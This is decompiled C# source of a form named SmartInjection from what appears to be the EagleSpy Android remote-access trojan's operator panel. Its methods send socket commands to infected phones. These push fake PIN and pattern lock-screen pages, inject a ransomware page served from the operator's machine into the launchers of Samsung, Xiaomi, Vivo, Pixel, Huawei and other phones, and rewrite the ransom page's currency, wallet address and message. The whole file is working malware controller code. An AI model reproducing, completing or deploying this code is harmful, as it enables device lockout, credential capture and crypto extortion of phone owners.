using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;
using Siticone.Desktop.UI.WinForms;

namespace Eaglespy
{
	// Token: 0x020000FB RID: 251
	public partial class SmartInjection : Form
	{
		// Token: 0x06000C92 RID: 3218 RVA: 0x000079FA File Offset: 0x00005BFA
		public SmartInjection()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000C93 RID: 3219 RVA: 0x00118C98 File Offset: 0x00116E98
		private void drakeUIButtonIcon5_Click_1(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\xampp\\htdocs\\lock\\pattern\\index.html";
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000C94 RID: 3220 RVA: 0x00118DE4 File Offset: 0x00116FE4
		private void samsung()
		{
			string text = "samsung>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.sec.android.app.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C95 RID: 3221 RVA: 0x00118F38 File Offset: 0x00117138
		private void redmi()
		{
			string text = "redmi>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.miui.home>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C96 RID: 3222 RVA: 0x0011908C File Offset: 0x0011728C
		private void realme()
		{
			string text = "realme>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.android.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C97 RID: 3223 RVA: 0x001191E0 File Offset: 0x001173E0
		private void oppo()
		{
			string text = "oppo>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.oppo.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C98 RID: 3224 RVA: 0x00119334 File Offset: 0x00117534
		private void vivo()
		{
			string text = "vivo>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.bbk.launcher2>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C99 RID: 3225 RVA: 0x00119488 File Offset: 0x00117688
		private void pixel()
		{
			string text = "pixel>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.google.android.apps.nexuslauncher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C9A RID: 3226 RVA: 0x001195DC File Offset: 0x001177DC
		private void motorola()
		{
			string text = "motorola>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.motorola.launcher3>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C9B RID: 3227 RVA: 0x00119730 File Offset: 0x00117930
		private void huawei()
		{
			string text = "huawei>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.huawei.android.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C9C RID: 3228 RVA: 0x00119884 File Offset: 0x00117A84
		private void poco()
		{
			string text = "poco>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.mi.android.globallauncher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C9D RID: 3229 RVA: 0x001199D8 File Offset: 0x00117BD8
		private void drakeUIButtonIcon9_Click_1(object sender, EventArgs e)
		{
			this.Replacecurrency();
			this.Replacecaddress();
			this.ReplacecDES();
			this.poco();
			this.huawei();
			this.motorola();
			this.pixel();
			this.vivo();
			this.oppo();
			this.samsung();
			this.redmi();
			this.realme();
		}

		// Token: 0x06000C9E RID: 3230 RVA: 0x00119A30 File Offset: 0x00117C30
		private void drakeUIButtonIcon10_Click(object sender, EventArgs e)
		{
			string text = "poco";
			string[] array = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array2);
			string text2 = "huawei";
			string[] array3 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array4 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text2,
					Data.SPL_SOCKET,
					array3[0],
					Data.SPL_SOCKET,
					array3[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array4);
			string text3 = "motorola";
			string[] array5 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array6 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text3,
					Data.SPL_SOCKET,
					array5[0],
					Data.SPL_SOCKET,
					array5[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array6);
			string text4 = "pixel";
			string[] array7 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array8 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text4,
					Data.SPL_SOCKET,
					array7[0],
					Data.SPL_SOCKET,
					array7[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array8);
			string text5 = "vivo";
			string[] array9 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array10 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text5,
					Data.SPL_SOCKET,
					array9[0],
					Data.SPL_SOCKET,
					array9[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array10);
			string text6 = "oppo";
			string[] array11 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array12 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text6,
					Data.SPL_SOCKET,
					array11[0],
					Data.SPL_SOCKET,
					array11[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array12);
			string text7 = "samsung";
			string[] array13 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array14 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text7,
					Data.SPL_SOCKET,
					array13[0],
					Data.SPL_SOCKET,
					array13[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array14);
			string text8 = "redmi";
			string[] array15 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array16 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text8,
					Data.SPL_SOCKET,
					array15[0],
					Data.SPL_SOCKET,
					array15[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array16);
			string text9 = "realme";
			string[] array17 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array18 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text9,
					Data.SPL_SOCKET,
					array17[0],
					Data.SPL_SOCKET,
					array17[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array18);
		}

		// Token: 0x06000C9F RID: 3231 RVA: 0x0011A3AC File Offset: 0x001185AC
		private void Replacecurrency()
		{
			string text = "C:\\xampp\\htdocs\\ransomeware\\crypto.html";
			string text2 = "<h1>" + this.guna2TextBox3.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 123)
				{
					array[122] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000CA0 RID: 3232 RVA: 0x0011A43C File Offset: 0x0011863C
		private void Replacecaddress()
		{
			string text = "return";
			string text2 = "C:\\xampp\\htdocs\\ransomeware\\crypto.html";
			string text3 = text + " '" + this.guna2TextBox5.Text + "'";
			try
			{
				string[] array = File.ReadAllLines(text2);
				if (array.Length >= 193)
				{
					array[192] = text3;
					File.WriteAllLines(text2, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000CA1 RID: 3233 RVA: 0x0011A4D8 File Offset: 0x001186D8
		private void ReplacecDES()
		{
			string text = "C:\\xampp\\htdocs\\ransomeware\\crypto.html";
			string text2 = "<p>" + this.drakeUIRichTextBox1.Text + "<p>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 136)
				{
					array[135] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000CA2 RID: 3234 RVA: 0x0011A570 File Offset: 0x00118770
		private void Replaceclockpin()
		{
			string text = "C:\\xampp\\htdocs\\lock\\pin.html";
			string text2 = "<p>" + this.guna2TextBox2.Text + "<p>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 141)
				{
					array[140] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000CA3 RID: 3235 RVA: 0x0011A608 File Offset: 0x00118808
		private void Replaceclockpattern()
		{
			string text = "C:\\xampp\\htdocs\\lock\\pattern.html";
			string text2 = "<p>" + this.guna2TextBox1.Text + "<p>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 107)
				{
					array[106] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000CA4 RID: 3236 RVA: 0x0011A698 File Offset: 0x00118898
		private void Displayipv4()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.label11.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000CA5 RID: 3237 RVA: 0x0011A714 File Offset: 0x00118914
		private void drakeUIButtonIcon8_Click_1(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\xampp\\htdocs\\lock\\pin\\index.html";
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000CA6 RID: 3238 RVA: 0x00007A08 File Offset: 0x00005C08
		private void SmartInjection_Load(object sender, EventArgs e)
		{
			this.Displayipv4();
		}

		// Token: 0x06000CA7 RID: 3239 RVA: 0x00002423 File Offset: 0x00000623
		private void namescombo_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x04000FE1 RID: 4065
		public Client Classclient;
	}
}
